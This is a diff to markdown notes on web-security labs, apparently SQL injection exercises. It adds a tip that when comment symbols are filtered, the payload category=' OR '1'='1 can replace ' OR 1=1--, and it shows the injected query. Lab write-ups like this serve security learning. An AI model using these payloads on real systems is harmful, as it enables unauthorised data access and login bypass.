@@ -31,6 +31,10 @@ category=' OR 1=1--
 ```SQL
 SELECT * FROM products WHERE category = 'any_category' OR 1=1--' AND released = 1
 ```
+> `Note:` Some servers block the comment symbols as `#` and `--`, so we can use the condition with the single quotes like that:
+```
+category=' OR '1'='1
+```
 -----------------------------------------------------------------------
 
 ### Lab2: SQL injection vulnerability allowing login bypass
